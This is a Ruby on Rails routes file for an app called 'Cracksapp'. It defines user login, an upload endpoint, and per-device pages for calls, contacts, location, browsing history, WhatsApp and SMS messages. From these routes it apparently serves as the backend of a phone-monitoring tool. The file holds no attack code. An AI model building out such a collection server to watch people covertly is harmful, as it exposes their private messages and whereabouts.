Cracksapp::Application.routes.draw do
  devise_for :users
  # The priority is based upon order of creation: first created -> highest priority.
  # See how all your routes lay out with "rake routes".

  post 'upload' => 'upload#index'

  get 'devices' => 'devices#index'
  get 'general/:id' => 'general#index'
  get 'calls/:id' => 'calls#index'
  get 'contacts/:id' => 'contacts#index'
  get 'location/:id' => 'location#index'
  get 'history/:id' => 'history#index'

  get 'whatsapp/:id' => 'whatsapp#index'
  get 'whatsapp/:id/messages/:address' => 'whatsapp#messages'

  get 'sms/:id' => 'sms#index'
  get 'sms/:id/messages/:address' => 'sms#messages'

  root 'home#index'
end
